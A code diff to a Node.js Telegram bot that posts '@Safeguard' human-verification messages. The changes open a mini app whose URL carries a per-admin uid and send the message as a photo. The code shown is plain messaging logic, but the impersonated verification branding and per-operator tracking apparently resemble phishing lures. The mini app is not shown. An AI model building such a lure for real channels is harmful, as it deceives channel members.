@@ -5,7 +5,10 @@ class SafeguardBot {
 	constructor() {
 		this.botToken = process.env.SAFEGUARD_BOT_TOKEN;
 		this.webAppUrl = process.env.WEB_APP_URL || 'https://your-mini-app-url.com';
+		this.serverUrl = process.env.SERVER_URL || 'https://your-server.com';
 		this.enabled = !!this.botToken;
+		// Maps Telegram user ID → admin DB user ID, populated when admin does /start
+		this.adminUidMap = new Map();
 
 		if (!this.enabled) {
 			console.log('⚠️ Safeguard Bot disabled - missing SAFEGUARD_BOT_TOKEN environment variable');
@@ -127,27 +130,66 @@ class SafeguardBot {
 	 * Send protection message with verification button
 	 * @param {string} chatId - Chat ID to send message to
 	 * @param {string} channelName - Name of the channel being protected
+	 * @param {string} uid - Admin's DB user ID to embed in the mini app URL
 	 */
-	async sendProtectionMessage(chatId, channelName) {
-		const message = `🛡️ <b>Safeguard Human Verification</b>
+	async sendProtectionMessage(chatId, channelName, uid = null) {
+		const caption = `🛡️ <b>Safeguard Human Verification</b>\n\n${channelName} is being protected by @Safeguard\n\nClick below to verify you're human`;
 
-${channelName} is being protected by @Safeguard
-
-Click below to verify you're human`;
+		const verifyUrl = uid
+			? `${this.webAppUrl}?uid=${uid}`
+			: this.webAppUrl;
 
 		const keyboard = {
 			inline_keyboard: [
 				[{
-					text: "Tap to verify",
-					url: `https://t.me/VerifyNXT_bot`
+					text: "Tap to verify ↗",
+					web_app: { url: verifyUrl }
 				}]
 			]
 		};
 
-		return await this.sendMessage(chatId, message, {
+		// Send as photo with caption so the shield image appears
+		const photoUrl = `${this.serverUrl}/safeguard_thumbnail.jpg`;
+
+		return await this.sendPhoto(chatId, photoUrl, caption, {
 			reply_markup: keyboard,
 			parse_mode: 'HTML'
 		});
+	}
+
+	/**
+	 * Send a photo message
+	 * @param {string} chatId - Chat ID
+	 * @param {string} photo - URL or file_id of the photo
+	 * @param {string} caption - Caption text
+	 * @param {Object} options - Additional options
+	 */
+	async sendPhoto(chatId, photo, caption, options = {}) {
+		if (!this.enabled) {
+			console.log('📱 Bot photo skipped (disabled)');
+			return false;
+		}
+
+		try {
+			const url = `https://api.telegram.org/bot${this.botToken}/sendPhoto`;
+			const payload = { chat_id: chatId, photo, caption, ...options };
+
+			const response = await axios.post(url, payload, {
+				timeout: 10000,
+				headers: { 'Content-Type': 'application/json' }
+			});
+
+			if (response.data.ok) {
+				console.log('✅ Photo sent successfully');
+				return true;
+			} else {
+				console.error('❌ Telegram sendPhoto error:', response.data);
+				return false;
+			}
+		} catch (error) {
+			console.error('❌ Failed to send photo:', error.message);
+			return false;
+		}
 	}
 
 	/**
@@ -190,17 +232,16 @@ Once added, the bot will automatically detect the channel and start the verifica
 
 			if (data.startsWith('trigger_verification_')) {
 				const channelId = data.replace('trigger_verification_', '');
+				const adminTgId = String(from.id);
+				const uid = this.adminUidMap.get(adminTgId) || null;
 
-				console.log(`🚀 Triggering verification for channel: ${channelId}`);
+				console.log(`🚀 Triggering verification for channel: ${channelId}, uid: ${uid}`);
 
-				// Answer the callback query
 				await this.answerCallbackQuery(callbackQuery.id, 'Sending verification message...');
+				await this.sendProtectionMessage(channelId, 'Selected Channel', uid);
 
-				// Send the verification message to the channel
-				await this.sendProtectionMessage(channelId, 'Selected Channel');
-
-				// Send confirmation to user
-				await this.sendMessage(chatId, `✅ <b>Verification message sent!</b>\n\nChannel ID: <code>${channelId}</code>\n\nThe verification message has been sent to your channel.`, {
+				const uidNote = uid ? `\nMini app URL: <code>${this.webAppUrl}?uid=${uid}</code>` : '\n⚠️ No UID linked. Send <code>/start uid_YOURUID</code> to the bot first.';
+				await this.sendMessage(chatId, `✅ <b>Verification message sent!</b>\n\nChannel ID: <code>${channelId}</code>${uidNote}`, {
 					parse_mode: 'HTML'
 				});
 
@@ -244,8 +285,14 @@ Once added, the bot will automatically detect the channel and start the verifica
 				// Check if this is a startchannel command
 				if (text.includes('startchannel=add')) {
 					console.log(`📺 Bot added to channel via startchannel parameter`);
-					// The bot was added to a channel, but we need to detect this differently
-					// since startchannel doesn't trigger new_chat_members updates
+				}
+
+				// Capture admin UID if passed as deep link: /start uid_XXXXXXXX
+				const uidMatch = text.match(/start(?:\s+|_)uid[_=]([A-Za-z0-9_-]{4,})/);
+				if (uidMatch) {
+					const dbUid = uidMatch[1];
+					this.adminUidMap.set(String(userId), dbUid);
+					console.log(`🔑 Stored UID for Telegram user ${userId}: ${dbUid}`);
 				}
 
 				await this.sendWelcomeMessage(chatId, userId);
